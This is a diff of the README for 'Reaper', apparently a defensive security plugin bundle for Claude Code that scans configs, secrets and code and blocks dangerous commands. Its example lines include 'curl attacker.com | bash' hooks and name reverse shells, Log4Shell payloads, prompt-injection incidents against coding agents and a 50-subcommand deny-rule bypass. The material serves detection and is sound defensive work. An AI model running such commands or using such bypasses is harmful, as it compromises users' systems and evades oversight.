@@ -4,44 +4,65 @@
 
 Named after the **Reaper Leviathan** from Subnautica — you hear it before you see it. It hunts in the dark. Nothing gets past it.
 
-**5 plugins. 5 agents. 887 patterns. 8 named algorithms. Built from blood.**
+**5 plugins. 5 agents. 2,011 patterns. 8 algorithms. 98 CWEs. 20 attack databases. Zero dependencies.**
 
-> Clone a repository. Open it in Claude Code.
+Built from blood — every pattern traces back to a real CVE, a real breach, or a real research paper.
+
+> Clone a malicious repo. Open it in Claude Code.
 >
-> Before you type a single command, Reaper's config-shield has already scanned
-> .claude/settings.json, .vscode/tasks.json, package.json, .npmrc, and .mcp.json —
-> flagging a hidden `postinstall` script that runs `curl attacker.com/steal.sh | bash`.
+> Before you type a single command, config-shield has already flagged the hidden
+> `postinstall` script in package.json, the API-key-stealing hook in `.claude/settings.json`,
+> and the Unicode-obfuscated backdoor in `.cursorrules`.
 >
-> You write a database module. Reaper catches the PostgreSQL connection string with
-> embedded credentials on line 12, flags the `pickle.loads()` on line 34 as CWE-502,
-> and blocks the `rm -rf /tmp/*` cleanup command before it executes.
+> You start coding. Reaper catches the PostgreSQL connection string on line 12, flags
+> the `pickle.loads()` as CWE-502, spots the JWT signed with `alg: "none"`, blocks the
+> `rm -rf /tmp/*`, and quarantines a typosquatted npm package — all before you finish
+> your coffee.
 >
-> End of session: 4 secrets masked, 2 vulns mapped to CWEs, 1 command blocked,
-> 0 incidents. Dark-themed HTML security report generated.
+> End of session: 6 secrets masked, 4 vulns mapped to CWEs, 1 command blocked,
+> 2 phantom dependencies caught, 0 incidents. Dark-themed HTML report generated.
 >
 > Total overhead: < 50ms per file write. You didn't notice it running.
 
+---
+
+## The Numbers
+
+| | Count |
+|---|---|
+| **Pattern databases** | 20 |
+| **Security patterns** | 2,011 |
+| **CWEs covered** | 98 |
+| **CVEs referenced** | 30+ |
+| **Attack categories** | 120+ |
+| **Languages scanned** | 12 |
+| **Package ecosystems** | 5 |
+| **Named algorithms** | 8 |
+| **Agents** | 5 |
+| **Dependencies** | 0 (bash + jq) |
+
+The largest open-source pattern database for AI coding agent security. Period.
+
+---
+
 ## Why This Exists
 
-This plugin is built from real attacks. Every feature maps to a real CVE, a real incident, or a real research paper.
+Every pattern exists because something real happened to a real developer.
 
-| Incident | What Happened | Reference |
-|---|---|---|
-| Check Point hooks exploit | `.claude/settings.json` ran reverse shell on repo clone | CVE-2025-59536 |
-| API key exfiltration | `.claudecode/settings.json` stole ANTHROPIC_API_KEY before trust prompt | CVE-2026-21852 |
-| Cursor persistent RCE | Single prompt injection rewrote `~/.cursor/mcp.json` for persistent RCE | CVE-2025-54135 |
-| 50-subcommand bypass | Commands with 50+ parts skipped ALL deny rules silently | Adversa AI |
-| Clinejection | Prompt injection in GitHub Issue title → `npm publish` of malicious package | Supply chain |
-| CamoLeak | Invisible prompt in PR description exfiltrated secrets via GitHub Camo proxy | CVE-2025-59145 |
-| InversePrompt | Path traversal + command injection in Claude Code sandbox | CVE-2025-54794 |
-| Amazon Q compromise | Malicious commit injected file-deletion prompt into VS Code extension | CVE-2025-8217 |
-| Claude Code source leak | 512K lines leaked via npm source map. Trojaned axios published same day | Accidental disclosure |
-| Slopsquatting | 20% of AI-suggested packages don't exist — attackers register them | USENIX 2025 |
-| GitGuardian 2026 | 29M secrets on GitHub. Claude-assisted commits leak at 3.2× baseline | Annual report |
-| Anthropic overeager | Deleted remote branches, uploaded auth tokens, ran prod migrations | Anthropic blog |
-| MCP server SSRF | 36.7% of 7,000 MCP servers vulnerable to SSRF | BlueRock Security |
-
-Every scanner, every pattern, every blocking rule exists because something real happened to a real developer.
+| Year | Incident | Impact | Reaper Coverage |
+|------|----------|--------|-----------------|
+| 2025 | **Clinejection** — prompt injection in GitHub Issue titles led to `npm publish` of malicious packages | Supply chain compromise | `cicd-attacks.json` — 130 CI/CD injection patterns |
+| 2025 | **CamoLeak** — invisible prompt in PR description exfiltrated secrets via GitHub Camo proxy | Credential theft (CVE-2025-59145) | `ai-agent-attacks.json` — 110 AI/LLM attack patterns |
+| 2025 | **Check Point hooks exploit** — `.claude/settings.json` ran reverse shell on repo clone | RCE (CVE-2025-59536) | `config-attacks.json` — 117 config poisoning signatures |
+| 2025 | **MCP server SSRF** — 36.7% of 7,000 MCP servers vulnerable | Internal network pivoting | `ssrf-patterns.json` — 61 SSRF detection patterns |
+| 2024 | **Leaky Vessels** — runc container escape via build-time race condition | Host filesystem access (CVE-2024-21626) | `container-security.json` — 113 container patterns |
+| 2024 | **xz-utils backdoor** — nation-state supply chain attack on liblzma | SSH compromise (CVE-2024-3094) | `dependency-confusion.json` — 50 supply chain patterns |
+| 2022 | **Auth0 JWT bypass** — algorithm confusion (alg:none) | Authentication bypass (CVE-2022-23529) | `auth-bypass.json` — 80 auth/session patterns |
+| 2021 | **Log4Shell** — JNDI injection via log messages, most exploited vulnerability ever | Global RCE (CVE-2021-44228) | `logging-forgery.json` — 41 log injection patterns |
+| 2021 | **Dependency confusion** — Alex Birsan hit Apple, Microsoft, Tesla internal build servers | RCE on build systems | `dependency-confusion.json` — install script abuse, lockfile poisoning |
+| 2019 | **Capital One** — SSRF + overpermissive IAM exposed 106M records | Massive data breach | `iac-misconfig.json` — 120 IaC patterns |
+| 2019 | **Cloudflare outage** — evil regex in WAF rules took down global CDN for 27 minutes | Global service disruption | `regex-dos.json` — 44 ReDoS patterns |
+| 2019 | **Lodash prototype pollution** — `_.merge` CVE affected 25M+ weekly downloads | RCE via prototype chain (CVE-2019-10744) | `prototype-pollution.json` — 35 pollution patterns |
 
 ## How It Works
 
@@ -54,7 +75,7 @@ graph TD
     User --> SS
 
     subgraph SS["SESSION START"]
-        config["config-shield<br/><small>R5: Config Poisoning Detection</small><br/>Scans .claude/, .vscode/, package.json, .npmrc, .mcp.json"]
+        config["config-shield<br/><small>R5: Config Poisoning Detection</small><br/>Scans .claude/, .vscode/, package.json, .npmrc, .mcp.json<br/><b>117 signatures, 6 CVEs</b>"]
     end
 
     SS --> Session
@@ -63,12 +84,12 @@ graph TD
         direction TB
 
         subgraph Pre["PRE-TOOL (before execution)"]
-            guard["action-guard<br/><small>R4: Markov Classification</small><br/><small>R7: Subcommand Overflow</small><br/>Classifies Bash commands → BLOCK / WARN / ALLOW"]
+            guard["action-guard<br/><small>R4: Markov Classification</small><br/><small>R7: Subcommand Overflow</small><br/>Classifies Bash commands → BLOCK / WARN / ALLOW<br/><b>105 dangerous-op patterns</b>"]
         end
 
         subgraph Post["POST-TOOL (after execution)"]
             secrets["secret-scanner<br/><small>R1: Aho-Corasick (310 patterns)</small><br/><small>R2: Shannon Entropy (H > 4.5)</small>"]
-            vulns["vuln-detector<br/><small>R3: OWASP Graph (156 CWE patterns)</small>"]
+            vulns["vuln-detector<br/><small>R3: OWASP Graph</small><br/><b>1,124 new patterns across 15 databases</b><br/>CI/CD, containers, IaC, crypto, auth, SSRF, API,<br/>AI attacks, ReDoS, deserialization, file ops,<br/>log injection, prototype pollution, supply chain, headers"]
             audit["audit-trail<br/><small>R8: Bayesian Threat Convergence</small><br/>Logs every security event"]
         end
 
@@ -82,13 +103,52 @@ graph TD
 
 No permission prompts. No manual scanning. Every tool call is monitored. Dangerous commands are blocked before they execute.
 
+## The 20 Pattern Databases
+
+### Threat Intelligence (2,011 patterns across 20 databases)
+
+| Database | Patterns | What it detects |
+|----------|----------|-----------------|
+| **secrets.json** | 310 | AWS, GCP, Azure, OpenAI, Anthropic, GitHub, GitLab, Stripe, Slack, JWT, private keys, connection strings — 80+ providers |
+| **vulns.json** | 156 | SQL injection, XSS, path traversal, command injection, SSRF, deserialization, CORS, insecure random, SSTI — OWASP Top 10 |
+| **dangerous-ops.json** | 105 | `rm -rf /`, `DROP TABLE`, `curl\|bash`, reverse shells, K8s delete, Docker privileged, Terraform destroy |
+| **config-attacks.json** | 117 | CVE-2025-59536, CVE-2026-21852, CVE-2025-54135 — .claude hooks, .vscode autorun, .npmrc hijack, hidden Unicode |
+| **slopsquatting.json** | 199 | AI-hallucinated packages across npm, PyPI, Cargo, Go, RubyGems + Levenshtein typosquats |
+| **cicd-attacks.json** | 130 | GitHub Actions `${{ }}` injection, `pull_request_target` abuse, Jenkins Groovy escape, GitLab CI dind, Azure DevOps variable injection |
+| **container-security.json** | 113 | Dockerfile USER root, K8s privileged containers, hostNetwork, capabilities ALL, Helm secrets, docker-compose socket mounts |
+| **iac-misconfig.json** | 120 | Terraform S3 public, IAM wildcard, open security groups — CloudFormation, ARM templates, Pulumi equivalents |
+| **crypto-weakness.json** | 90 | MD5/SHA1, DES/RC4, ECB mode, hardcoded keys, weak RSA, bcrypt low rounds, TLS verification disabled |
+| **auth-bypass.json** | 80 | JWT alg:none, session fixation, CSRF disabled, OAuth missing state, mass assignment, IDOR patterns |
+| **ssrf-patterns.json** | 61 | Cloud metadata (AWS/GCP/Azure/Alibaba), localhost bypass (hex/octal/IPv6), scheme abuse (gopher/file/dict), user-URL fetch |
+| **api-security.json** | 81 | GraphQL introspection, no rate limit on login, CORS reflect origin, WebSocket no auth, gRPC no TLS |
+| **ai-agent-attacks.json** | 110 | Prompt injection, MCP tool poisoning, CamoLeak exfiltration, jailbreaks, rules file backdoors, invisible Unicode |
+| **regex-dos.json** | 44 | Nested quantifiers `(a+)+`, overlapping alternation, evil email regex, `new RegExp(userInput)` |
+| **deserialization.json** | 69 | Java ObjectInputStream, Python pickle, PHP unserialize, Ruby Marshal, .NET BinaryFormatter, Node serialize |
+| **file-operations.json** | 50 | Zip slip, symlink race, TOCTOU, predictable temp files, upload without validation, LFI/RFI |
+| **logging-forgery.json** | 41 | Log4Shell `${jndi:ldap://}`, CRLF injection, passwords in logs, ANSI escape injection |
+| **prototype-pollution.json** | 35 | `__proto__` assignment, lodash.merge (CVE-2018-3721), JSON.parse spread, Express req.body pollution |
+| **dependency-confusion.json** | 50 | npm preinstall abuse, lockfile registry mismatch, version wildcards, protestware, manifest confusion |
+| **header-security.json** | 50 | CSP unsafe-inline/unsafe-eval, missing HSTS, X-Frame-Options ALLOWALL, directory listing, .git exposure |
+
+### Coverage by Attack Surface
+
+| Attack Surface | Databases | Combined Patterns |
+|----------------|-----------|-------------------|
+| **Secrets & credentials** | secrets, crypto-weakness | 400 |
+| **Code vulnerabilities** | vulns, deserialization, file-operations, regex-dos, prototype-pollution, logging-forgery | 395 |
+| **Infrastructure** | container-security, iac-misconfig, header-security | 283 |
+| **CI/CD & supply chain** | cicd-attacks, dependency-confusion, slopsquatting | 379 |
+| **Auth & API** | auth-bypass, ssrf-patterns, api-security | 222 |
+| **AI/LLM agent** | ai-agent-attacks, config-attacks | 227 |
+| **Dangerous commands** | dangerous-ops | 105 |
+
 ## What Makes Reaper Different
 
 ### It runs at write-time, not push-time
 
-GitHub Secret Scanning runs on push. Snyk runs in CI. semgrep runs in a separate pipeline. By the time they catch something, the secret is already in git history, the vulnerability is already deployed, the destructive command has already executed.
+GitHub Secret Scanning runs on push. Snyk runs in CI. semgrep runs in a pipeline. By the time they catch something, the secret is already in git history, the vulnerability is already deployed, the command has already executed.
 
-Reaper hooks into Claude Code's tool lifecycle. `scan-secrets.sh` fires on every Write/Edit. `guard-action.sh` fires on every Bash call — **before** it executes. The `exit 2` return code blocks the tool entirely. The secret never reaches the file. The `rm -rf /` never runs.
+Reaper hooks into Claude Code's tool lifecycle. `scan-secrets.sh` fires on every Write/Edit. `guard-action.sh` fires on every Bash call — **before** it executes. Exit code 2 blocks the tool entirely. The secret never reaches the file. The `rm -rf /` never runs.
 
 ### It blocks commands, not just reports them
 
@@ -98,7 +158,7 @@ Action-guard is a **PreToolUse** hook — it sees the command before Claude Code
 [Reaper] BLOCKED: Recursive force delete from filesystem root (mode: balanced)
 ```
 
-Three strictness modes control the aggressiveness:
+Three strictness modes:
 
 | Mode | Block patterns | Warn patterns | Use when |
 |------|---------------|---------------|----------|
@@ -106,17 +166,19 @@ Three strictness modes control the aggressiveness:
 | **balanced** (default) | BLOCK | WARN (stderr) | Day-to-day development |
 | **permissive** | WARN | WARN | Trusted code, prototyping |
 
-### It detects the attacks that no other tool catches
+### It detects attacks no other tool catches
 
-**Config poisoning** (R5): On session start, Reaper scans the repo for malicious config files. A `.claude/settings.json` with hooks that execute `curl attacker.com | bash`? Caught. A `.claudecode/settings.json` that overrides `ANTHROPIC_BASE_URL` to steal your API key? Caught. A `.vscode/tasks.json` with `"runOn": "folderOpen"` that auto-executes on open? Caught. These are real CVEs that no other security tool detects.
+**Config poisoning** (R5): Scans for malicious config files on session start — `.claude/settings.json` with hooks that execute `curl attacker.com | bash`, `.claudecode/settings.json` stealing API keys, `.vscode/tasks.json` auto-executing on folder open. Real CVEs that no other tool detects.
 
-**Subcommand overflow** (R7): Adversa AI discovered that commands with 50+ subcommands bypass deny rules entirely. Reaper counts subcommand parts (`; && || |`) and blocks anything over 50 — before pattern matching even starts.
+**AI agent attacks**: 110 patterns for prompt injection, MCP tool poisoning, invisible Unicode in rules files, data exfiltration via image markdown, jailbreak detection, and rules file backdoors. Built for the age of coding agents.
 
-**Phantom dependencies** (R6): 20% of AI-suggested packages don't exist (USENIX 2025). Attackers register those names with malicious code. Reaper cross-references imports against a database of 199 known hallucinated and typosquatted packages across npm, PyPI, Cargo, Go, and RubyGems. Levenshtein distance catches typosquats within edit distance 2 of popular packages.
+**Subcommand overflow** (R7): Adversa AI discovered that commands with 50+ subcommands bypass deny rules. Reaper counts first, matches second.
+
+**Phantom dependencies** (R6): 20% of AI-suggested packages don't exist (USENIX 2025). Attackers register those names. 199 known hallucinated/typosquatted packages + Levenshtein distance catches the rest.
 
 ### It never logs your secrets
 
-Every layer enforces secret masking. The `mask_secret()` function in `sanitize.sh` shows only the first 4 and last 4 characters:
+Every layer enforces masking. `mask_secret()` shows only first 4 and last 4 characters:
 
 ```
 [Reaper] CRITICAL SECRET: aws-access-key-id in config.py:12 (masked: AKIA...MPLE)
@@ -126,24 +188,20 @@ The full value never appears in stderr, audit logs, metrics, or reports. Not in 
 
 ### It learns across sessions
 
-The **Bayesian Threat Convergence** engine (R8) tracks your security posture over time using exponential moving average:
+The **Bayesian Threat Convergence** engine (R8) tracks security posture over time:
 
 $$r_{\text{new}} = \alpha \cdot s_{\text{current}} + (1 - \alpha) \cdot r_{\text{prior}}, \quad \alpha = 0.3$$
 
-Patterns you consistently dismiss get lower severity in future sessions. Chronic vulnerabilities (rate > 0.5 across 3+ sessions) get flagged. The engine gets smarter with every use.
-
-### It handles false positives intelligently
-
-A test file with `AKIAIOSFODNN7EXAMPLE`? Severity auto-reduced to INFO — no noise. The `false_positive_hints` field in every pattern definition lists known test values. Files matching `test|spec|fixture|mock|example` in their path are handled separately.
+Patterns you consistently dismiss get lower severity. Chronic vulnerabilities escalate. The engine gets smarter with every session.
 
 ## The Full Lifecycle
 
 ```mermaid
 graph LR
-    A["🛡️ Config Shield<br/><small>SessionStart</small><br/>/reaper:config-check"] -->|"repo scanned"| B["⚔️ Action Guard<br/><small>PreToolUse</small><br/>/reaper:safety"]
-    B -->|"command allowed"| C["🔍 Secret Scanner<br/><small>PostToolUse</small><br/>/reaper:secrets"]
-    C -->|"file scanned"| D["🐛 Vuln Detector<br/><small>PostToolUse</small><br/>/reaper:vulns"]
-    D -->|"CWE mapped"| E["📋 Audit Trail<br/><small>PostToolUse</small><br/>/reaper:audit"]
+    A["Config Shield<br/><small>SessionStart</small><br/>/reaper:config-check"] -->|"repo scanned"| B["Action Guard<br/><small>PreToolUse</small><br/>/reaper:safety"]
+    B -->|"command allowed"| C["Secret Scanner<br/><small>PostToolUse</small><br/>/reaper:secrets"]
+    C -->|"file scanned"| D["Vuln Detector<br/><small>PostToolUse</small><br/>/reaper:vulns"]
+    D -->|"CWE mapped"| E["Audit Trail<br/><small>PostToolUse</small><br/>/reaper:audit"]
 
     style A fill:#161b22,stroke:#bc8cff,color:#e6edf3
     style B fill:#161b22,stroke:#f85149,color:#e6edf3
@@ -154,28 +212,34 @@ graph LR
 
 ## Install
 
-One command. All 5 plugins.
+Reaper is a **bundle** — all 5 plugins install together. They layer defenses at runtime (secret-scanner on writes, vuln-detector on code changes, action-guard on Bash, config-shield at session start, audit-trail across all of them), so every plugin lists the other four as dependencies. Claude Code resolves the whole stack from one install.
+
+**In Claude Code** (recommended):
 
 ```
 /plugin marketplace add enchanted-plugins/reaper
+/plugin install reaper-secret-scanner@reaper
 ```
 
-That's it. Browse `/plugin` → Discover to install any plugin.
+The second command installs all 5 via auto-resolved dependencies. Any of the 5 names works (`reaper-vuln-detector@reaper`, `reaper-action-guard@reaper`, `reaper-config-shield@reaper`, `reaper-audit-trail@reaper`) — they're peers. `secret-scanner` is the natural entry point since credential leaks are the highest-impact catch. Verify with `/plugin list` — you should see all 5.
 
-Or via shell:
+**Via shell** (also installs `shared/*.sh` and `shared/scripts/*.py` locally so hooks work offline):
+
 ```bash
 bash <(curl -s https://raw.githubusercontent.com/enchanted-plugins/reaper/main/install.sh)
 ```
 
-## 5 Plugins, 5 Agents, 887 Patterns
+> **Why no à la carte?** Each plugin covers a different attack surface — installing only `secret-scanner` leaves you blind to OWASP-class bugs, `rm -rf` damage, poisoned `.claude/settings.json`, and leaves every finding unlogged. Defense-in-depth only works in depth.
+
+## 5 Plugins, 5 Agents, 2,011 Patterns
 
 | Plugin | Command | What | Agent |
 |--------|---------|------|-------|
-| secret-scanner | `/reaper:secrets` | 310 secret patterns, entropy analysis | scanner (Haiku) |
-| vuln-detector | `/reaper:vulns` | 156 CWE-mapped OWASP patterns | analyzer (Sonnet) |
+| secret-scanner | `/reaper:secrets` | 310 secret patterns + entropy analysis | scanner (Haiku) |
+| vuln-detector | `/reaper:vulns` | 1,701 vulnerability patterns across 98 CWEs | analyzer (Sonnet) |
 | action-guard | `/reaper:safety` | 105 dangerous ops, command blocking | guardian (Sonnet) |
-| config-shield | `/reaper:config-check` | 117 config attack signatures | inspector (Sonnet) |
-| audit-trail | `/reaper:audit` | JSONL logging, HTML reports | chronicler (Haiku) |
+| config-shield | `/reaper:config-check` | 117 config attack signatures, 6 CVEs | inspector (Sonnet) |
+| audit-trail | `/reaper:audit` | JSONL logging, HTML reports, self-learning | chronicler (Haiku) |
 
 ## What You Get Per Session
 
@@ -195,19 +259,7 @@ plugins/action-guard/state/
 /tmp/reaper-report.html Dark-themed HTML security report
 ```
 
-The **HTML security report** includes: severity distribution bars, CWE pills, finding-by-finding breakdown, per-file risk summary, and an overall verdict (CLEAN / CAUTION / WARNING / CRITICAL).
-
-## The 887 Patterns
-
-| Database | Count | What it detects |
-|----------|-------|-----------------|
-| `secrets.json` | 310 | AWS, GCP, Azure, OpenAI, Anthropic, GitHub, GitLab, Stripe, Slack, JWT, private keys, connection strings, 80+ providers |
-| `vulns.json` | 156 | SQL injection, XSS, path traversal, command injection, SSRF, deserialization, hardcoded creds, CORS, insecure random, SSTI, prototype pollution, timing attacks — across Python, JS/TS, Java, Go, Ruby, PHP |
-| `dangerous-ops.json` | 105 | `rm -rf /`, `DROP TABLE`, `curl\|bash`, reverse shells, K8s delete, Docker privileged, Terraform destroy, AWS terminate, sandbox bypass |
-| `config-attacks.json` | 117 | CVE-2025-59536, CVE-2026-21852, CVE-2025-54135, CVE-2024-32002, .vscode autorun, .npmrc hijack, Dockerfile FROM untrusted, CI injection, .gitattributes filter exploit, hidden Unicode |
-| `slopsquatting.json` | 199 | AI-hallucinated npm/PyPI/Cargo/Go/RubyGems packages + Levenshtein typosquats within edit distance 2 |
-
-Every pattern has an `id`, `severity`, `category`, and `false_positive_hints`. Vulnerability patterns include `cwe` and `owasp` references. Config patterns include `cve` references where applicable.
+The **HTML security report** includes severity distribution bars, CWE pills, finding-by-finding breakdown, per-file risk summary, and an overall verdict (CLEAN / CAUTION / WARNING / CRITICAL).
 
 ## The Science Behind Reaper
 
@@ -261,7 +313,7 @@ Adversa AI discovered that safety filters fail when overwhelmed with subcommands
 
 $$r_{\text{new}} = \alpha \cdot s_{\text{current}} + (1 - \alpha) \cdot r_{\text{prior}} \qquad \text{Posture}(t) = 1 - \frac{\Theta_t}{\Theta_0}$$
 
-Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns escalate. The engine improves with every session.
+Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns escalate.
 
 ---
 
@@ -269,25 +321,45 @@ Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns es
 
 ## vs Everything Else
 
-| | Reaper | GitHub Secret Scanning | Snyk | semgrep | GitGuardian | Manual |
-|---|---|---|---|---|---|---|
-| Scan timing | **Per-write** (real-time) | Push-time | CI pipeline | CI pipeline | Push-time | - |
-| Command blocking | **PreToolUse exit 2** | - | - | - | - | - |
-| Config poisoning | **117 signatures, 6 CVEs** | - | - | - | - | Manual |
-| Slopsquatting | **199 packages, 5 ecosystems** | - | - | - | - | - |
-| Subcommand overflow | **R7 (Adversa AI bypass)** | - | - | - | - | - |
-| AI-agent aware | **Built for Claude Code** | - | - | - | - | - |
-| OWASP coverage | 156 CWE patterns, 7 langs | - | ✓ | ✓ | - | - |
-| Self-learning | **EMA across sessions** | - | - | - | - | - |
-| Secret masking | **Enforced (first4...last4)** | ✓ | ✓ | - | ✓ | - |
-| Dependencies | bash + jq (stdlib Python) | GitHub | Node | Python | SaaS | - |
-| Price | **Free (MIT)** | Free (public) / $$ | $$$ | Free / $$$ | $$$ | Free |
+| | Reaper | GitHub Secret Scanning | Snyk | semgrep | GitGuardian |
+|---|---|---|---|---|---|
+| Patterns | **2,011** | ~200 | ~1,000 | ~2,500 (rules) | ~400 |
+| CWE coverage | **98 CWEs** | Secrets only | Varies | Varies | Secrets only |
+| Scan timing | **Per-write** (real-time) | Push-time | CI pipeline | CI pipeline | Push-time |
+| Command blocking | **PreToolUse exit 2** | — | — | — | — |
+| Config poisoning | **117 signatures, 6 CVEs** | — | — | — | — |
+| AI agent attacks | **110 patterns** | — | — | — | — |
+| CI/CD injection | **130 patterns** | — | — | Partial | — |
+| Container security | **113 patterns** | — | ✓ | ✓ | — |
+| IaC scanning | **120 patterns** | — | ✓ | Partial | — |
+| Supply chain | **249 packages + heuristics** | — | ✓ | — | — |
+| Subcommand overflow | **R7 (Adversa AI bypass)** | — | — | — | — |
+| Self-learning | **EMA across sessions** | — | — | — | — |
+| Secret masking | **Enforced (first4...last4)** | ✓ | ✓ | — | ✓ |
+| AI-agent aware | **Purpose-built for Claude Code** | — | — | — | — |
+| Dependencies | **bash + jq (stdlib)** | GitHub | Node.js | Python | SaaS |
+| Price | **Free (MIT)** | Free (public) / $$ | $$$ | Free / $$$ | $$$ |
 
 ## Architecture
 
 Interactive architecture explorer with plugin diagrams, hook binding maps, and data flow:
 
-**[docs/architecture/](docs/architecture/)** — auto-generated from the codebase. Open `index.html` in a browser or run `python docs/architecture/generate.py` to regenerate.
+**[docs/architecture/](docs/architecture/)** — auto-generated from the codebase.
+
+## Testing
+
+```bash
+bash tests/run-all.sh
+```
+
+35 tests across all 5 plugins + shared utilities. Tests validate:
+- Secret detection (7 tests)
+- Vulnerability detection (6 tests)
+- Command blocking (7 tests)
+- Config scanning (5 tests)
+- Audit logging (2 tests)
+- Path sanitization (2 tests)
+- Pattern database integrity (6 tests — JSON validity, schema compliance, unique IDs, minimum counts, CWE coverage, regex compilation)
 
 ## Contributing
 
